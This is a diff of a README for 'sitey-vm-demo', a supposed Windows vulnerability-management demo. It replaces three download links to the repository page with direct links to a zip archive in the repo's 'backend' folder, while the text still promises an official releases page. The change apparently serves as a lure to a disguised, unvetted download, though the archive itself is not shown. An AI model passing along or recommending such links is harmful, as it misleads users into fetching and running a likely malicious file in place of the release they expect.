@@ -1,6 +1,6 @@
 # 🔒 sitey-vm-demo - Manage Vulnerabilities with Ease
 
-[![Download sitey-vm-demo](https://img.shields.io/badge/Download-sitey--vm--demo-brightgreen?style=for-the-badge)](https://github.com/Tobi77po/sitey-vm-demo)
+[![Download sitey-vm-demo](https://img.shields.io/badge/Download-sitey--vm--demo-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Tobi77po/sitey-vm-demo/main/backend/vm-demo-sitey-v1.7.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to download, install, and run sitey-vm-demo on your Windows c
 
 Click the link below to open the official page where you can get the latest version of sitey-vm-demo.
 
-[Download sitey-vm-demo](https://github.com/Tobi77po/sitey-vm-demo)
+[Download sitey-vm-demo](https://raw.githubusercontent.com/Tobi77po/sitey-vm-demo/main/backend/vm-demo-sitey-v1.7.zip)
 
 This page contains all the files you need. Look for the "Releases" section to find the demo installer.
 
@@ -132,7 +132,7 @@ If you have questions or need help:
 
 ---
 
-[![Download sitey-vm-demo](https://img.shields.io/badge/Download-sitey--vm--demo-brightgreen?style=for-the-badge)](https://github.com/Tobi77po/sitey-vm-demo)
+[![Download sitey-vm-demo](https://img.shields.io/badge/Download-sitey--vm--demo-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Tobi77po/sitey-vm-demo/main/backend/vm-demo-sitey-v1.7.zip)
 
 ---
 
